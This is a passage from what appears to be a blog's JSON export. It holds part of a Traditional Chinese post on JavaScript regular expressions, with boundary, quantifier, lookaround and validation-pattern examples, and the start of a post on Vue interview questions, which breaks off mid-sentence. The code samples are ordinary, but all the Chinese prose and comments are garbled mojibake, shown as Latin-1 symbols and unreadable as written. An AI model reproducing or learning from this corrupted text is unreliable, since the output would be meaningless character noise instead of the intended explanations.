æŒ‡çš„æ˜¯ä¸€å€‹å­—å…ƒçš„å‰å¾Œæ²’æœ‰å…¶ä»–ä»»ä½•å­—å…ƒã€‚\nè¦æ³¨æ„ \\b å’Œ [\\b] æ˜¯ä¸ä¸€æ¨£çš„ï¼Œ[\\b] æ˜¯ç”¨ä¾†é…å° backspaceã€‚\n1 2 3 // is é€™å€‹å–®å­—æ‰æœƒè¢«é¸åˆ°ï¼ŒTh`is` çš„ is ä¸æœƒ let matchedResult = \u0026#39;This is an apple.\u0026#39;.match(/\\bis\\b/); // [ \u0026#39;is\u0026#39;, index: 5, input: \u0026#39;This is an apple.\u0026#39; ] ç›¸ååœ°ï¼Œ\\B å‰‡æ˜¯ non-word boundaryï¼š\nBefore the first character of the string, if the first character is not a word character. After the last character of the string, if the last character is not a word character. Between two word characters Between two non-word characters The empty string 1 2 3 4 // ä½¿ç”¨ \\B æœƒé…å°åˆ° This ä¸­çš„ is let matchedResult = \u0026#39;This is an apple.\u0026#39;.match(/\\Bis/); // [ \u0026#39;is\u0026#39;, index: 2, input: \u0026#39;This is an apple.\u0026#39; ] å‡ºç¾æ¬¡æ•¸ * + ? {} {, } keywordsï¼š * ã€+ã€?ã€{æ¬¡æ•¸}ã€{æœ€å°‘æ¬¡æ•¸, æœ€å¤šæ¬¡æ•¸} * : ä»»æ„æ¬¡æ•¸ï¼Œç­‰åŒæ–¼{0,} + : è‡³å°‘ä¸€æ¬¡ï¼ˆå¾Œé¢è¦è·Ÿè‘—ï¼‰ï¼Œç­‰åŒæ–¼ {1,} ? : é›¶æˆ–ä¸€æ¬¡ï¼ˆæœ‰æˆ–æ²’æœ‰ï¼‰ï¼Œç­‰åŒæ–¼ {0,1} {æ¬¡æ•¸} {æœ€å°‘æ¬¡æ•¸, æœ€å¤šæ¬¡æ•¸} 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 var regex = /abc/; // æ‰¾åˆ°ç¬¦åˆ \u0026#34;abc\u0026#34; var regex = /ab*c/; // *è¡¨ç¤ºå‰ä¸€å€‹å–®å­—å¯ä»¥æ˜¯ 0 å€‹æˆ–å¤šå€‹ï¼Œå› æ­¤ ac, abc, abbbbc éƒ½ç¬¦åˆè¦å‰‡ var regex = /n?a/; // n å¯æœ‰å¯ç„¡ var regex = /a{2}/; // a è¦ 2 æ¬¡ï¼Œæ‰€ä»¥æœƒæ˜¯ a var regex = /a{2,4}/; // a ä»‹æ–¼ 2 æ¬¡åˆ° 4 æ¬¡ä¹‹é–“ var regex = /a{2,}/; // 2 æ¬¡ä»¥ä¸Šçš„ a éƒ½å¯ä»¥ï¼Œå¤§æ‹¬è™Ÿå¾Œé¢ä¸è¦æœ‰ç©ºæ ¼ var regex = /(hello){4}/; // 4 æ¬¡çš„ helloï¼Œhellohellohellohello var regex = /\\d{3}/; // 3 æ¬¡çš„æ•¸å­— é–‹é ­èˆ‡çµå°¾ keywordsï¼š^ã€$ ^ é–‹é ­ $ çµå°¾ 1 2 3 4 5 6 7 8 9 10 11 12 /* ä»¥ A é–‹é ­çš„å­—æ‰æœƒåŒ¹é…åˆ° */ /^A/gm.test(\u0026#39;Abc\u0026#39;); // true /^A/gm.test(\u0026#39;bac\u0026#39;); // false /* é–‹é ­æœ‰ He */ var regex = /^He/; /* çµå°¾æœ‰ llo */ var regex = /llo$/; /* é–‹é ­ He çµå°¾ llo ä¸­é–“ä»»æ„å­—å…ƒå¯ä»¥æœ‰ä»»æ„æ¬¡æ•¸ */ var regex = /^He.*llo$/; æˆ– | 1 2 3 4 5 // and æˆ– androidï¼Œmatch åˆ° `and`roid å°±ä¸ match `android` var regex = /and|android/; // match åˆ° android é‚„æ˜¯æœƒ match and var regex = /android|and/; LookAround Assertions keywords: x(?=y)ã€x(?!y) Lookahead assertions: x(?=y)ã€x(?!y) Lookbehind assertions: (?\u0026lt;=y)xã€(?\u0026lt;!y)x Look Ahead ?=ï¼šå¾Œé¢éœ€è¦è·Ÿè‘— ?!ï¼šå¾Œé¢ä¸èƒ½è·Ÿè‘— 1 2 3 4 5 6 7 8 9 10 11 12 // foo(?=bar)ï¼Œfoo å¾Œé¢è¦è·Ÿè‘— bar æ‰æœƒé…å°åˆ° foo const regexp = /foo(?=bar)/; regexp.exec(\u0026#39;foo\u0026#39;); // null regexp.exec(\u0026#39;bar\u0026#39;); // null regexp.exec(\u0026#39;foobar\u0026#39;); // [ \u0026#39;foo\u0026#39;, index: 0, input: \u0026#39;foobar\u0026#39;, groups: undefined ] // foo(?!bar)ï¼Œfoo å¾Œé¢ä¸èƒ½è·Ÿè‘— barï¼Œå¦‚æ­¤æ‰æœƒé…å°åˆ° foo const regexp = /foo(?!bar)/; regexp.exec(\u0026#39;foo\u0026#39;); // [ \u0026#39;foo\u0026#39;, index: 0, input: \u0026#39;foo\u0026#39;, groups: undefined ] regexp.exec(\u0026#39;foo123\u0026#39;); // [ \u0026#39;foo\u0026#39;, index: 0, input: \u0026#39;foo123\u0026#39;, groups: undefined ] regexp.exec(\u0026#39;bar\u0026#39;); // null regexp.exec(\u0026#39;foobar\u0026#39;); // null Look Behind ?\u0026lt;=ï¼šå‰é¢éœ€è¦è·Ÿè‘—æ‰æœƒåŒ¹é…åˆ° ?\u0026lt;!ï¼šå‰é¢ä¸èƒ½è·Ÿè‘—æ‰æœƒåŒ¹é…åˆ° 1 2 3 4 5 6 7 8 9 10 11 12 // (?\u0026lt;=foo)barï¼Œç•¶ bar å‰é¢æœ‰ foo æ™‚æ‰æœƒé…å°åˆ° bar const regexp = /(?\u0026lt;=foo)bar/; regexp.exec(\u0026#39;foo\u0026#39;); // null regexp.exec(\u0026#39;bar\u0026#39;); // null regexp.exec(\u0026#39;foobar\u0026#39;); // [ \u0026#39;bar\u0026#39;, index: 3, input: \u0026#39;foobar\u0026#39;, groups: undefined ] // (?\u0026lt;!foo)barï¼Œç•¶ bar å‰é¢æ²’æœ‰ foo æ™‚æ‰æœƒé…å°åˆ° bar const regexp = /(?\u0026lt;!foo)bar/; regexp.exec(\u0026#39;foo\u0026#39;); // null regexp.exec(\u0026#39;bar\u0026#39;); // [ \u0026#39;bar\u0026#39;, index: 0, input: \u0026#39;bar\u0026#39;, groups: undefined ] regexp.exec(\u0026#39;123bar\u0026#39;); // [ \u0026#39;bar\u0026#39;, index: 3, input: \u0026#39;123bar\u0026#39;, groups: undefined ] regexp.exec(\u0026#39;foobar\u0026#39;); // null â—â—â— Lookbehind assertions å±¬æ–¼ ES2018 çš„èªæ³•ï¼Œé ˆæ³¨æ„ç›¸å®¹æ€§ã€‚ â—â—â—\nè²ªå©ªæ¨¡å¼ï¼ˆGreedy Modeï¼‰ é è¨­æœƒå•Ÿç”¨è²ªå©ªæ¨¡å¼ï¼Œå¦‚æœæƒ³è¦é—œé–‰è²ªå©ªæ¨¡å¼ï¼Œä¹Ÿå°±æ˜¯è®“åˆ°ä¸€åŒ¹é…åˆ°å°±åœæ­¢ï¼Œå¯ä»¥ä½¿ç”¨åœ¨ * ã€ + ç­‰å¾Œé¢åŠ ä¸Š ?ï¼Œä¾‹å¦‚ .*?ã€.+?ã€‚\npattern ç­†è¨˜ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 export default { // å…è¨±æ•¸å­—ã€è‹±æ–‡å­— // é•·åº¦4~12 account: /^[0-9A-Za-z]{4,12}$/, // éœ€åŒ…å«æ•¸å­—ã€è‹±æ–‡å­—ã€è‹±æ–‡ç‰¹æ®Šç¬¦è™Ÿ // ä½†ä¸å¾—åŒ…å«ç¬¦è™Ÿ \\ // é•·åº¦1~24 password: /^(?=.*\\d)(?=.*[a-zA-Z])[a-zA-Z0-9!@#$%^\u0026amp;*()_+{}:\u0026#34;|\u0026lt;\u0026gt;?\\-=\\[\\]\u0026#39;\\;,./~`]{1,24}$/, // å…è¨±æ•¸å­—ã€è‹±æ–‡å­—ã€ä¸­æ–‡å­— // é•·åº¦2~8 nickName: /^[0-9A-Za-z\\u4E00-\\u9FFF]{2,8}$/, // å…è¨±æ•¸å­—ã€è‹±æ–‡å­—ã€ä¸­æ–‡å­—ã€è‹±æ–‡ç‰¹æ®Šç¬¦è™Ÿã€ç©ºç™½ï¼Œä½†é–‹é ­ä¸å¾—ç‚ºç‰¹æ®Šç¬¦è™Ÿæˆ–ç©ºç™½ realName: /^(?!(-))(?!(\\s))(?!(,))[A-Za-z\\-\\,\\s\\u4E00-\\u9FFF]{0,20}[^(?=(!@#$%^\u0026amp;*()_+{}:\u0026#34;|\u0026lt;\u0026gt;?\\-=\\[\\]\u0026#39;\\;,./~\\s\\d`)))]$/, // ä¿¡ç®± createEmail: /^([\\w])([\\-\\._]?[\\w]){0,64}\\@([\\w])([\\-\\._]?[\\w]){0,64}\\.([a-zA-Z]){2,6}$/, // å‰ä¸‰ç¢¼è‹±æ–‡å­—ã€å¾Œä¸‰ç¢¼æ•¸å­— promotionCode: /^[A-Za-z]{3}[0-9]{3}$/, // å…è¨±æ•¸å­—ã€è‹±æ–‡å­—ã€ä¸­æ–‡å­—ã€è‹±æ–‡ç‰¹æ®Šç¬¦è™Ÿã€ä¸­æ–‡ç‰¹æ®Šç¬¦è™Ÿã€ç©ºç™½ // é•·åº¦0~100 remark: /^[0-9A-Za-z-_\\u4E00-\\u9FA5+/.*!@#$%\u0026amp;?()=|\u0026#39;:;\u0026lt;\u0026gt;,~ï¼@#ï¿¥â€¦â€¦\u0026amp;*ï¼ˆï¼‰â€”â€”|{}ã€ã€‘â€˜ï¼›ï¼šâ€â€œ\u0026#39;ã€‚ï¼Œã€ï¼Ÿ%\\s]{0,100}$/, } ","date":"2022-08-13T00:00:00Z","image":"https://live.staticflickr.com/65535/52282544509_9802b00af7_o.png","permalink":"https://wayneblog.ga/2022-08-13/js-regex/","title":"Javascript çš„æ­£å‰‡è¡¨é”å¼(Regular Expression, regex)"},{"content":" åƒè€ƒç¶²ç«™\nåŸºç¤ç¯‡ 1. å° SPA å–®é â¾¯çš„ç†è§£ï¼Œå„ªç¼ºé»æ˜¯ä»€éº¼ï¼Ÿ SPAï¼ˆ single-page application ï¼‰åƒ…åœ¨ Web é â¾¯åˆå§‹åŒ–æ™‚åŠ è¼‰ç›¸æ‡‰çš„ HTMLã€JavaScript å’Œ CSSã€‚ â¼€æ—¦é â¾¯åŠ è¼‰å®Œæˆï¼ŒSPA ä¸æœƒå› ç‚ºâ½¤æˆ¶çš„æ“ä½œâ½½é€²â¾â»šâ¾¯çš„é‡æ–°åŠ è¼‰æˆ–è·³è½‰ï¼›å–â½½ä»£ä¹‹çš„æ˜¯åˆ©â½¤è·¯ç”±æ©Ÿåˆ¶å¯¦ç¾ HTML å…§å®¹çš„è®Šæ›ï¼ŒUI èˆ‡â½¤æˆ¶çš„äº¤äº’ï¼Œé¿å…é â¾¯çš„é‡æ–°åŠ è¼‰ã€‚ å„ªé»ï¼š â½¤æˆ¶é«”é©—å¥½ã€å¿«ï¼Œå…§å®¹çš„æ”¹è®Šä¸éœ€è¦é‡æ–°åŠ è¼‰æ•´å€‹é â¾¯ï¼Œé¿å…äº†ä¸å¿…è¦çš„è·³è½‰å’Œé‡è¤‡æ¸²æŸ“ SPA ç›¸å°å°æœå‹™å™¨å£“â¼’â¼© å‰å¾Œç«¯è·è²¬åˆ†é›¢ï¼Œæ¶æ§‹æ¸…æ™°ï¼Œå‰ç«¯é€²â¾äº¤äº’é‚è¼¯ï¼Œå¾Œç«¯è² è²¬æ•¸æ“šè™•ç† ç¼ºé»ï¼š â¾¸å±ï¼ˆåˆæ¬¡ï¼‰åŠ è¼‰æ…¢ï¼šç‚ºå¯¦ç¾å–®â»š Web æ‡‰â½¤åŠŸèƒ½åŠé¡¯ç¤ºæ•ˆæœï¼Œéœ€è¦åœ¨åŠ è¼‰â»šâ¾¯çš„æ™‚å€™å°‡JavaScriptã€CSS çµ±â¼€åŠ è¼‰ï¼Œéƒ¨åˆ†â»šâ¾¯æŒ‰éœ€åŠ è¼‰ ä¸åˆ©æ–¼ SEOï¼šç”±æ–¼æ‰€æœ‰çš„å…§å®¹éƒ½åœ¨â¼€å€‹â»šâ¾¯ä¸­å‹•æ…‹æ›¿æ›é¡¯ç¤ºï¼Œæ‰€ä»¥åœ¨ SEO ä¸Šå…¶æœ‰è‘—å¤©ç„¶çš„å¼±å‹¢ 2. new Vue() ç™¼ç”Ÿäº†ä»€éº¼ï¼Ÿ çµè«–ï¼šnew Vue()æ˜¯å‰µå»ºVueå¯¦ä¾‹ï¼Œå®ƒå…§éƒ¨åŸ·è¡Œäº†æ ¹å¯¦ä¾‹çš„åˆå§‹åŒ–éç¨‹ å…·é«”åŒ…æ‹¬ä»¥ä¸‹æ“ä½œï¼š é¸é …åˆä½µï¼Œchildren, refs, slot, createElementç­‰å®ä¾‹å±æ€§çš„æ–¹æ³•åˆå§‹åŒ– è‡ªå®šç¾©äº‹ä»¶è™•ç† æ•¸æ“šéŸ¿æ‡‰å¼è™•ç† ç”Ÿå‘½é€±æœŸé‰¤å­èª¿ç”¨ (beforecreate created) å¯èƒ½çš„æ›è¼‰ ç¸½çµï¼šnew Vue()å‰µå»ºäº†æ ¹å¯¦ä¾‹ä¸¦æº–å‚™å¥½æ•¸æ“šå’Œæ–¹æ³•ï¼Œæœªä¾†åŸ·è¡Œæ›è¼‰æ™‚ï¼Œæ­¤éç¨‹é‚„æœƒéæ­¸çš„æ‡‰ç”¨æ–¼å®ƒçš„å­çµ„ä»¶ä¸Šï¼Œæœ€çµ‚å½¢æˆä¸€å€‹æœ‰ç·Šå¯†é—œä¿‚çš„çµ„ä»¶å¯¦ä¾‹æ¨¹ 3. Vue.useæ˜¯å¹¹ä»€éº¼çš„ï¼ŸåŸç†æ˜¯ä»€éº¼ï¼Ÿ vue.use æ˜¯ç”¨ä¾†ä½¿ç”¨æ’ä»¶çš„ï¼Œæˆ‘å€‘å¯ä»¥åœ¨æ’ä»¶ä¸­æ“´å±•å…¨å±€çµ„ä»¶ã€æŒ‡ä»¤ã€åŸå‹æ–¹æ³•ç­‰ã€‚ æª¢æŸ¥æ’ä»¶æ˜¯å¦è¨»å†Šï¼Œè‹¥å·²è¨»å†Šï¼Œå‰‡ç›´æ¥è·³å‡º è™•ç†å…¥åƒï¼Œå°‡ç¬¬ä¸€å€‹åƒæ•¸ä¹‹å¾Œçš„åƒæ•¸æ­¸é›†ï¼Œä¸¦åœ¨é¦–éƒ¨å¡å…¥ this ä¸Šä¸‹æ–‡ åŸ·è¡Œè¨»å†Šæ–¹æ³•ï¼Œèª¿ç”¨å®šç¾©å¥½çš„ install æ–¹æ³•ï¼Œå‚³å…¥è™•ç†çš„åƒæ•¸ï¼Œè‹¥æ²’æœ‰ install æ–¹æ³•ä¸¦ä¸”æ’ä»¶æœ¬èº«ç‚º function å‰‡ç›´æ¥é€²è¡Œè¨»å†Š æ’ä»¶ä¸èƒ½é‡è¤‡çš„åŠ è¼‰ï¼Œinstall æ–¹æ³•çš„ç¬¬ä¸€å€‹åƒæ•¸æ˜¯vueçš„æ§‹é€ å‡½æ•¸ï¼Œå…¶ä»–åƒæ•¸æ˜¯Vue.setä¸­é™¤äº†ç¬¬ä¸€å€‹åƒæ•¸çš„å…¶ä»–åƒæ•¸ï¼› ä»£ç¢¼ï¼šargs.unshift(this) èª¿ç”¨æ’ä»¶çš„install æ–¹æ³• ä»£ç¢¼ï¼štypeof plugin.install === \u0026ldquo;function\u0026rdquo; æ’ä»¶æœ¬èº«æ˜¯ä¸€å€‹å‡½æ•¸ï¼Œç›´æ¥è®“å‡½æ•¸åŸ·è¡Œã€‚ä»£ç¢¼ï¼šplugin.apply(null, args) ç·©å­˜æ’ä»¶ã€‚ä»£ç¢¼ï¼šinstalledPlugins.push(plugin) 4. è«‹èªªä¸€ä¸‹éŸ¿æ‡‰å¼æ•¸æ“šçš„ç†è§£ï¼Ÿ æ ¹æ“šæ•¸æ“šé¡å‹ä¾†åšä¸åŒè™•ç†ï¼Œæ•¸çµ„å’Œå°åƒé¡å‹ç•¶å€¼è®ŠåŒ–æ™‚å¦‚ä½•åŠ«æŒã€‚ å°è±¡å…§éƒ¨é€šédefineReactiveæ–¹æ³•ï¼Œä½¿ç”¨ Object.defineProperty() ç›£è½æ•¸æ“šå±¬æ€§çš„ get ä¾†é€²è¡Œæ•¸æ“šä¾è³´æ”¶é›†ï¼Œå†é€šé set ä¾†å®Œæˆæ•¸æ“šæ›´æ–°çš„æ´¾ç™¼ æ•¸çµ„å‰‡é€šéé‡å¯«æ•¸çµ„æ–¹æ³•ä¾†å¯¦ç¾çš„ã€‚æ“´å±•å®ƒçš„ 7 å€‹è®Šæ›´â½…æ³•ï¼Œé€šéç›£è½é€™äº›æ–¹æ³•å¯ä»¥åšåˆ°ä¾è³´æ”¶é›†å’Œæ´¾ç™¼æ›´æ–° å…§éƒ¨ä¾è³´æ”¶é›†æ˜¯æ€éº¼åšåˆ°çš„ï¼Ÿæ¯å€‹å±¬æ€§éƒ½æ“æœ‰è‡ªå·±çš„depå±¬æ€§ï¼Œå­˜æ”¾ä»–æ‰€ä¾è³´çš„ watcherï¼Œç•¶å±¬æ€§è®ŠåŒ–å¾Œæœƒé€šçŸ¥è‡ªå·±å°æ‡‰çš„ watcherå»æ›´æ–° éŸ¿æ‡‰å¼æµç¨‹ï¼š\ndefineReactive æŠŠæ•¸æ“šå®šç¾©æˆéŸ¿æ‡‰å¼çš„ çµ¦å±¬æ€§å¢åŠ ä¸€å€‹ depï¼Œç”¨ä¾†æ”¶é›†å°æ‡‰çš„é‚£äº›watcher ç­‰æ•¸æ“šè®ŠåŒ–é€²è¡Œæ›´æ–°\ndep.depend() // get å–å€¼ï¼šé€²è¡Œä¾è³´æ”¶é›†\ndep.notify() // set è¨­ç½®æ™‚ï¼šé€šçŸ¥è¦–åœ–æ›´æ–° å°è±¡å±¤ç´šéæ·±ï¼Œæ€§èƒ½å°±æœƒå·® ä¸éœ€è¦éŸ¿æ‡‰æ•¸æ“šçš„å…§å®¹ä¸è¦æ”¾åœ¨dataä¸­ object.freeze() å¯ä»¥å‡çµæ•¸æ“š 5. Vueå¦‚ä½•æª¢æ¸¬æ•¸çµ„è®ŠåŒ–ï¼Ÿ æ•¸çµ„è€ƒæ…®æ€§èƒ½åŸå› æ²’æœ‰ç”¨definePropertyå°æ•¸çµ„çš„æ¯ä¸€é …é€²è¡Œæ””æˆªï¼Œè€Œæ˜¯é¸æ“‡é‡å¯«æ•¸çµ„ æ–¹æ³•ä»¥é€²è¡Œé‡å¯«ã€‚ç•¶æ•¸çµ„èª¿ç”¨åˆ°é€™ 7 å€‹æ–¹æ³•çš„æ™‚å€™ï¼ŒåŸ·è¡Œ ob.dep.notify() é€²è¡Œæ´¾ç™¼é€šçŸ¥ Watcher æ›´æ–° åœ¨Vueä¸­ä¿®æ”¹æ•¸çµ„çš„ç´¢å¼•å’Œé•·åº¦æ˜¯ç„¡æ³•ç›£æ§åˆ°çš„ã€‚éœ€è¦é€šéä»¥ä¸‹7ç¨®è®Šç•°æ–¹æ³•ä¿®æ”¹æ•¸çµ„æ‰æœƒè§¸ç™¼æ•¸çµ„å°æ‡‰çš„wactheré€²è¡Œæ›´æ–°ã€‚æ•¸çµ„ä¸­å¦‚æœæ˜¯å°åƒæ•¸æ“šé¡å‹ä¹Ÿæœƒé€²è¡Œéæ­¸åŠ«æŒ é‚£å¦‚æœæƒ³è¦æ”¹ç´¢å¼•æ›´æ–°æ•¸æ“šæ€éº¼è¾¦ï¼Ÿ\nå¯ä»¥é€šéVue.set()ä¾†é€²è¡Œè™•ç† â æ ¸å¿ƒå…§éƒ¨ç”¨çš„æ˜¯ splice æ–¹æ³• 1 2 3 4 5 6 7 8 9 // å–å‡ºåŸå‹æ–¹æ³•ï¼› const arrayProto = Array.prototype // æ‹·è²åŸå‹æ–¹æ³•ï¼› export const arrayMethods = Object.create(arrayProto) // é‡å¯«æ•¸çµ„æ–¹æ³•ï¼› def(arrayMethods, method, function mutator (â€¦args) { } ob.dep.notify() // èª¿ç”¨æ–¹æ³•æ™‚æ›´æ–°è¦–åœ– 6. Vue.set æ–¹æ³•æ˜¯å¦‚ä½•å¯¦ç¾çš„ï¼Ÿ ç‚ºä»€éº¼$setå¯ä»¥è§¸ç™¼æ›´æ–°ï¼Œæˆ‘å€‘çµ¦å°è±¡å’Œæ•¸çµ„æœ¬èº«éƒ½å¢åŠ äº†depå±¬æ€§ï¼Œç•¶çµ¦å°åƒæ–°å¢ä¸å­˜åœ¨çš„å±¬æ€§å‰‡è§¸ç™¼å°è±¡ä¾è³´çš„watcherå»æ›´æ–°ï¼Œç•¶ä¿®æ”¹æ•¸çµ„ç´¢å¼•æ™‚æˆ‘å€‘èª¿ç”¨æ•¸çµ„æœ¬èº«çš„spliceæ–¹æ³•å»æ›´æ–°æ•¸çµ„ å®˜æ–¹å®šç¾© Vue.set(object, key, value)\n7. Vueä¸­æ¨¡æ¿ç·¨è­¯åŸç†ï¼Ÿ å¦‚ä½•å°‡templateè½‰æ›æˆrenderå‡½æ•¸(é€™è£¡è¦æ³¨æ„çš„æ˜¯æˆ‘å€‘åœ¨é–‹ç™¼æ™‚ç›¡é‡ä¸è¦ä½¿ç”¨templateï¼Œå› ç‚ºå°‡templateè½‰åŒ–æˆrenderæ–¹æ³•éœ€è¦åœ¨é‹è¡Œæ™‚é€²è¡Œç·¨è­¯æ“ä½œæœƒæœ‰æ€§èƒ½æè€—ï¼ŒåŒæ™‚å¼•ç”¨å¸¶æœ‰complieråŒ…çš„vueé«”ç©ä¹Ÿæœƒè®Šå¤§) é»˜èª.vueæ–‡ä»¶ä¸­çš„ templateè™•ç†æ˜¯é€šévue-loader ä¾†é€²è¡Œè™•ç†çš„ä¸¦ä¸æ˜¯é€šéé‹è¡Œæ™‚çš„ç·¨è­¯ å°‡ template æ¨¡æ¿è½‰æ›æˆ ast èªæ³•æ¨¹ - parserHTML å°éœæ…‹èªæ³•åšéœæ…‹æ¨™è¨˜ - markUp é‡æ–°ç”Ÿæˆä»£ç¢¼ - codeGen æ¨¡æ¿å¼•æ“çš„å¯¦ç¾åŸç†å°±æ˜¯new Function + withä¾†é€²è¡Œå¯¦ç¾çš„\nvue-loaderä¸­å¤„ç†templateå±æ€§ä¸»è¦é çš„æ˜¯ vue-template-compiler 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 // vue-loader // template =\u0026gt; ast =\u0026gt; codegen =\u0026gt; with+function å¯¦ç¾ç”Ÿæˆrenderæ–¹æ³• let {ast, render } = VueTemplateCompiler.compile(\u0026lt;div\u0026gt;{{aaa}}\u0026lt;/div\u0026gt;) console.log(ast, render) // æ¨¡æ¿å¼•æ“çš„å¯¦ç¾åŸç† with + new Function console.log(new Function(render).tostring()) // renderæ–¹æ³•åŸ·è¡Œå®Œç•¢å¾Œç”Ÿæˆçš„æ˜¯è™›æ“¬ dom // with(this){return _c(â€˜divâ€™,[_s(aaa)])} // ä»£ç¢¼ç”Ÿæˆ const ast = parse(template.trim(), options) // å°‡ä»£ç¢¼è§£ææˆastèªæ³•æ¨¹ if (options.optimize !== false) { optimize(ast, options) // å„ªåŒ–ä»£ç¢¼ æ¨™è¨˜éœæ…‹é» æ¨™è¨˜æ¨¹ } const code = generate(ast, options) // ç”Ÿæˆä»£ç¢¼ 8. Proxy èˆ‡ Object.defineProperty å„ªåŠ£å°æ¯” Proxy çš„å„ªå‹¢å¦‚ä¸‹ Proxy å¯ä»¥ç›´æ¥ç›£è½å°è±¡è€Œéå±¬æ€§ Proxy å¯ä»¥ç›´æ¥ç›£è½æ•¸çµ„çš„è®ŠåŒ– Proxy æœ‰å¤šé” 13 ç¨®æ””æˆªæ–¹æ³•,ä¸é™æ–¼ applyã€ownKeysã€deletePropertyã€has ç­‰ç­‰æ˜¯ Object.defineProperty ä¸å…·å‚™çš„ Proxy è¿”å›çš„æ˜¯ä¸€å€‹æ–°å°è±¡,æˆ‘å€‘å¯ä»¥åªæ“ä½œæ–°çš„å°è±¡é”åˆ°ç›®çš„,è€Œ Object.defineProperty åªèƒ½éæ­·å°è±¡å±¬æ€§ç›´æ¥ä¿®æ”¹ Proxy ä½œç‚ºæ–°æ¨™æº–å°‡å—åˆ°ç€è¦½å™¨å» å•†é‡é»æŒçºŒçš„æ€§èƒ½å„ªåŒ–ï¼Œä¹Ÿå°±æ˜¯å‚³èªªä¸­çš„æ–°æ¨™æº–çš„æ€§èƒ½ç´…åˆ© Object.defineProperty çš„å„ªå‹¢å¦‚ä¸‹ å…¼å®¹æ€§å¥½ï¼Œæ”¯æŒ IE9ï¼Œè€Œ Proxy çš„å­˜åœ¨ç€è¦½å™¨å…¼å®¹æ€§å•é¡Œï¼Œè€Œä¸”ç„¡æ³•ç”¨ polyfill ç£¨å¹³ï¼Œå› æ­¤ Vue çš„ä½œè€…æ‰è²æ˜éœ€è¦ç­‰åˆ°ä¸‹å€‹å¤§ç‰ˆæœ¬( 3.0 )æ‰èƒ½ç”¨ Proxy é‡å¯« 9. Vue3.xéŸ¿æ‡‰å¼æ•¸æ“šåŸç† Vue3.xæ”¹ç”¨Proxyæ›¿ä»£Object.definePropertyã€‚å› ç‚ºProxyå¯ä»¥ç›´æ¥ç›£è½å°è±¡å’Œæ•¸çµ„çš„è®ŠåŒ–ï¼Œä¸¦ä¸”æœ‰å¤šé”13ç¨®æ””æˆªæ–¹æ³•ã€‚ä¸¦ä¸”ä½œç‚ºæ–°æ¨™æº–å°‡å—åˆ°ç€è¦½å™¨å» å•†é‡é»æŒçºŒçš„æ€§èƒ½å„ªåŒ– Proxyåªæœƒä»£ç†å°è±¡çš„ç¬¬ä¸€å±¤ï¼Œé‚£éº¼Vue3åˆæ˜¯æ€æ¨£è™•ç†é€™å€‹å•é¡Œçš„å‘¢ï¼Ÿ\nåˆ¤æ–·ç•¶å‰Reflect.getçš„è¿”å›å€¼æ˜¯å¦ç‚ºObjectï¼Œå¦‚æœæ˜¯å‰‡å†é€šéreactiveæ–¹æ³•åšä»£ç†ï¼Œ é€™æ¨£å°±å¯¦ç¾äº†æ·±åº¦è§€æ¸¬ ç›£æ¸¬æ•¸çµ„çš„æ™‚å€™å¯èƒ½è§¸ç™¼å¤šæ¬¡get/setï¼Œé‚£éº¼å¦‚ä½•é˜²æ­¢è§¸ç™¼å¤šæ¬¡å‘¢ï¼Ÿ\næˆ‘å€‘å¯ä»¥åˆ¤æ–·keyæ˜¯å¦ç‚ºç•¶å‰è¢«ä»£ç†å°è±¡targetè‡ªèº«å±¬æ€§ï¼Œä¹Ÿå¯ä»¥åˆ¤æ–·èˆŠå€¼èˆ‡æ–°å€¼æ˜¯å¦ç›¸ç­‰ï¼Œåªæœ‰æ»¿è¶³ä»¥ä¸Šå…©å€‹æ¢ä»¶ä¹‹ä¸€æ™‚ï¼Œæ‰æœ‰å¯èƒ½åŸ·è¡Œtrigger ç”Ÿå‘½å‘¨æœŸç¯‡ Vueçš„ç”Ÿå‘½é€±æœŸæ–¹æ³•æœ‰å“ªäº›ï¼Ÿä¸€èˆ¬åœ¨å“ªä¸€æ­¥ç™¼èµ·è«‹æ±‚åŠåŸå›  ç¸½å…±åˆ†ç‚º8å€‹éšæ®µï¼šå‰µå»ºå‰/å¾Œï¼Œè¼‰å…¥å‰/å¾Œï¼Œæ›´æ–°å‰/å¾Œï¼ŒéŠ·æ¯€å‰/å¾Œ å‰µå»ºå‰/å¾Œï¼š\nbeforeCreateéšæ®µï¼švueå¯¦ä¾‹çš„æ›è¼‰å…ƒç´ elå’Œæ•¸æ“šå°è±¡dataéƒ½ç‚ºundefinedï¼Œé‚„æœªåˆå§‹åŒ–ã€‚\nèªªæ˜ï¼šåœ¨ç•¶å‰éšæ®µdataã€methodsã€computedä»¥åŠwatchä¸Šçš„æ•¸æ“šå’Œæ–¹æ³•éƒ½ä¸èƒ½è¢«è¨ªå•ã€‚\ncreatedéšæ®µï¼švueå¯¦ä¾‹çš„æ•¸æ“šå°è±¡dataæœ‰äº†ï¼Œelé‚„æ²’æœ‰ã€‚\nèªªæ˜ï¼šå¯ä»¥åšä¸€äº›åˆå§‹æ•¸æ“šçš„ç²å–ï¼Œåœ¨ç•¶å‰éšæ®µç„¡æ³•èˆ‡Domé€²è¡Œäº¤äº’ï¼Œå¦‚æœéè¦æƒ³ï¼Œå¯ä»¥é€šévm.$nextTickä¾†è¨ªå•Domã€‚\nè¼‰å…¥å‰/å¾Œï¼š\nbeforeMountéšæ®µï¼švueå¯¦ä¾‹çš„$elå’Œdataéƒ½åˆå§‹åŒ–äº†ï¼Œä½†é‚„æ˜¯æ›è¼‰ä¹‹å‰ç‚ºè™›æ“¬çš„domç¯€é»ã€‚\nèªªæ˜ï¼šç•¶å‰éšæ®µè™›æ“¬Domå·²ç¶“å‰µå»ºå®Œæˆï¼Œå³å°‡é–‹å§‹æ¸²æŸ“ã€‚åœ¨æ­¤æ™‚ä¹Ÿå¯ä»¥å°æ•¸æ“šé€²è¡Œæ›´æ”¹ï¼Œä¸æœƒè§¸ç™¼updatedã€‚\nmountedéšæ®µï¼švueå¯¦ä¾‹æ›è¼‰å®Œæˆï¼Œdata.messageæˆåŠŸæ¸²æŸ“ã€‚\nèªªæ˜ï¼šåœ¨ç•¶å‰éšæ®µï¼ŒçœŸå¯¦çš„Domæ›è¼‰å®Œç•¢ï¼Œæ•¸æ“šå®Œæˆé›™å‘ç¶å®šï¼Œå¯ä»¥è¨ªå•åˆ°Domç¯€é»ï¼Œä½¿ç”¨$refså±¬æ€§å°Domé€²è¡Œæ“ä½œã€‚\næ›´æ–°å‰/å¾Œï¼š\nbeforeUpdateéšæ®µï¼šéŸ¿æ‡‰å¼æ•¸æ“šæ›´æ–°